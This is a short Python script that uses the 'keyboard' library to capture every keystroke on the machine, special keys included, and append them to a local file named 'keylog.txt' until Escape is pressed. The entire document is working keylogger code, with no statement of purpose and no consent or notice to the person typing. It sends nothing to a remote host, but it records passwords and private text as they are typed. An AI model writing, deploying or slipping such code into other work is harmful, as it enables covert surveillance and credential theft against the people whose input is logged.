import keyboard

log_file = "keylog.txt"

def on_press(event):
    key = event.name
    if len(key) == 1:
        # It's a normal key
        with open(log_file, "a") as f:
            f.write(key)
    else:
        # Special key (e.g., shift, ctrl, arrow keys, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

keyboard.on_press(on_press)

# Run indefinitely
keyboard.wait("esc")
